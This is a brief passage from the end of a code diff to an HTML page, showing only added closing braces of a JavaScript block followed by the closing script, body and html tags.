+  });
+});
 </script>
 </body>
 </html>
